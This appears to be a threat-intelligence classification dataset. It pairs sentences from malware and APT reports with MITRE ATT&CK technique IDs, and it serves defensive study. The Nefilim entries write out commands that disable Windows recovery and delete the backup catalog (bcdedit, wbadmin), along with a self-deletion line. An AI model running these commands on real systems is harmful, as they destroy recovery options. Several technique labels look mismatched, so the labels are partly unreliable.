Like other ransomware threats, Nefilim encrypts files on the target system using AES-128 and adds NEFILIM, NEPHILIM, MERIN, TRAPGET, MEFILIN, TELEGRAM, SIGARETA, or OFFWHITE  extension to encrypted files. It uses an RSA-2048 public key embedded in the ransomware executable to encrypt the AES encryption key. It also adds a file that includes the ransom note to the root directory, such as C:\NEFILIM-DECRYPT.txt.	['T1486']
Deleting volume shadow copies is very typical behavior of ransomware. The Nefilim ransomware uses WMIC with the following command to delete all volume shadow copies on the system to prevent recovery. WMIC  is a command-line utility to access WMI.	['T1490']
Nefilim also uses bcdedit.exe twice to disable automatic Windows recovery features by modifying boot configuration data. bcdedit /set {default} recoveryenabled No bcdedit /set {default} bootstatuspolicy ignoreallfailures Moreover, the Nefilim ransomware uses wbadmin to delete the backup catalog: wbadmin delete catalog -quiet	['T1490']
Mandiant assesses with moderate confidence that the threat actor obtained the session token from the operators of the info-stealer malware. These tokens were used by the actor via public VPN providers to authenticate to the target’s Microsoft 365 environment.	['T1550.004']
To authenticate to vCenter the threat actor used a stolen session cookie for a Privileged Access Management (PAM) account.	['T1550.004']
In a particular campaign, Mandiant identified that the threat actor performed initial reconnaissance via a VPS provider located in the same region as the victim. Mandiant believes a misconfiguration by the threat actor meant that the VPN services running on the VPS stopped functioning after 8 hours.	['T1583.003']
APT41 used a malware variant called WIDETONE to conduct port scans on the specified subnets.	['T1046']
Figure 7 shows how DCRat collects the public IP address from the compromised host by accessing the IP web service named as “https[:]//ipinfo[.]io/json”.	['T1590.005']
DCRat will also drop a .bat file containing a script that runs the W32tm “stripchart” command on the compromised host. This command is used as a delay tactic for its execution and beaconing.	['T1124']
The following analytic detects a powershell script that enumerates the camera mounted to the targeted host.	['T1592.001']
The malware creates a shortcut %APPDATA%\dotNET.lnk pointing to the copy of the malware under %APPDATA%.	['T1547.009']
We detect the attachment file as W97M/Adnel or MHT/Dloader. This macro malware is usually attached in the spam emails as .doc files. It uses social engineering tricks to be able to run the malicious macro script that is disabled by default in Microsoft Office.	['T1586.001']
APT32 is widely known to use such social engineering techniques to trick a user into enabling macros, after which a file downloads multiple malicious payloads from remote servers.	['T1586.001']
We observed that the InstallUtil.exe process was being created in suspended mode. Once it started execution, we compared its memory artifacts to a benign execution of InstallUtil.exe and concluded that the malicious payload is being injected into the memory of the newly spawned InstallUtil.exe process. We also observed that no arguments are passed to InstallUtil, which would cause an error under normal execution since InstallUtil always expects at least one argument.	['T1218.004']
Version.dll and jucheck.exe are both important pieces of the execution chain used to launch BOOMMIC. Jucheck.exe is a legitimate java binary used to check for any updates. This file will load version.dll upon its execution. Version.dll is an unsigned and modified copy of a signed legitimate Windows DLL, normally found under %SYSTEMROOT%\System32, but retains its PE header. An additional import was added to the modified version.dll, which imports the malicious function from javafx_font.dll.	['T1574.002']
"Prior to executing BOOMMIC APT29 was observed creating persistence via a registry key for “Java Update” that would execute jucheck.exe from the directory that contained version.dll and the BOOMMIC payload.

One notable TTP observed by APT29 was the hunting for passwords stored in SYSVOL. This technique relies on passwords that are stored as part of Group Policy Preferences.	['T1552.006']
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process. This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system, this will load and execute the DLL/EXE in to memory without writing any files to disk.

Attackers modified the Dll and FuncName Registry values in HKLM\SOFTWARE[\WOW6432Node]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg{SIP_GUID} that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file.	['T1553']
A threat actor can craft a malicious file that would evade Mark of the Web (MOTW) defenses, resulting in a limited loss of integrity and availability of security features, which rely on MOTW tagging – for example, ‘Protected View’ in Microsoft Office. This zero-day has a moderate CVSS risk score of 5.4, because it only helps to avoid the Microsoft Defender SmartScreen defense mechanism, which has no RCE or DoS functionality.	['T1553.005']

BAT files were used to download and execute the Cring ransomware on the other systems in the compromised network. It also uses the Windows CertUtil program to help with the said download.	['T1105']
The ransomware can also get into the system through certain vulnerability exploits.. The abuse of the aforementioned Adobe ColdFusion flaw (CVE-2010-2861) to enter the system is a new development for the threat. In the past, Cring was also used to exploit a FortiGate VPN server vulnerability (CVE-2018-13379).	['T1203', 'T1588.006', 'T1587.004', 'T1499.004', 'T1190', 'T1210', 'T1588.005']

Finally, the file C:\Users\Public\ignit.vbs is deleted after execution.	['T1547.009']
“desktop.ini” is used to invoke regasm.exe to launch the payload found in C:\Users\Public\Libraries\core.dll as a hidden window without returning any error codes.	['T1622']
The actor's CovalentStealer tool stores collected files on a Microsoft OneDrive cloud folder.	['T1567.002']
The Chrome extension is installed and maintained by a number of plist files written to the user directory ~/Library/LaunchAgent/. To conceal the malicious behavior, the underlying commands in the plist files are obfuscated with Base64 encoding.	['T1647']
The first plist, ~/Library/LaunchAgents/com.safarii.extension.plist, does not use a StartInterval value like the Chrome variant, but instead uses RunAtLoad. The RunAtLoad parameter is executed when the user logs into their computer. Note that the plist file does not use the correct spelling of Safari. 	['T1647']

The Nefilim ransomware uses a batch file to stop services and kill processes in the local host. This batch file abuses taskill.exe using CMD to kill predefined services and processes in the target host. Nefilim distributes this batch file to multiple hosts using two batch files. One of the batch files uses the ‘copy’ command, and the other one uses WMI with hard-coded admin credentials.	['T1562.001']
"Nefilim removes itself from the target systems after infection with the following code: del C:\Users\admin\AppData\Local\Temp\<ransomware_file_name>.exe"" /s /f /q"""	['T1070.004']
The Nefilim ransomware queries volume information (disk volume name and serial number) and Cryptographic Machine GUID. Ransomware families use  Cryptographic Machine GUID and volume serial number to generate a unique identifier for the host for encryption/decryption processes. Nefilim obtains Cryptographic Machine GUID by querying the value of MachineGuid in the following Registry key: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography	['T1082']
Mandiant identified a campaign where the threat actors gained access to the target organization’s Microsoft 365 environment using a stolen session token. Mandiant analyzed the workstations belonging to the end user and discovered that some systems had been infected with CRYPTBOT, an info-stealer malware, shortly before the stolen session token was generated. Mandiant observed that in some cases the user downloaded the malware after browsing to low reputation websites offering free, or “cracked”, software.	['T1550.004']
when the method R is invoked, InstallUtil.exe is spawned in suspended mode. The memory blocks of the suspended process are unmapped and rewritten with the sections of the payload program passed as an argument to method R. The thread is allowed to continue after changes have been made to the entry point.	['T1055.012']
To facilitate the staging of BEACON on remote systems APT29 utilized a malicious certificate that allowed the group to impersonate a privileged user.	['T1588.004']
It can reflectively load a DLL/EXE in to the PowerShell process, or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, please lead the Notes section (GENERAL NOTES) for information on how to use them.	['T1620']
Like the function name says Invoke-ReflectivePEInjection loads an portable executable (PE) file or DLL into the current or remote process memory and executes this file in memory.	['T1620']
Invoke-Mimikatz.ps1 is the PowerShell implementation of Mimikatz. The PowerShell script loads Mimikatz.exe reflectively into the process memory.	['T1620']
Files contained within image files, like mounted ISO files, will not contain the Zone.Identifier Alternate Data Stream (ADS) flag that indicates the files have been downloaded from the internet (so called “mark-of-the-web”) as reported by Didier Stevens.	['T1553.005']
We believe that the modified library file, which we’ve named LOCKPICK, could weaken encryption for communications used by the appliance, but do not have enough evidence to confirm this	['T1600']
In the second variation, FireEye observed APT41 leverage the Microsoft BITSAdmin command-line tool to download install.bat (MD5: 7966c2c546b71e800397a67f942858d0) from known APT41 infrastructure 66.42.98[.]220 on port 12345.	['T1571']
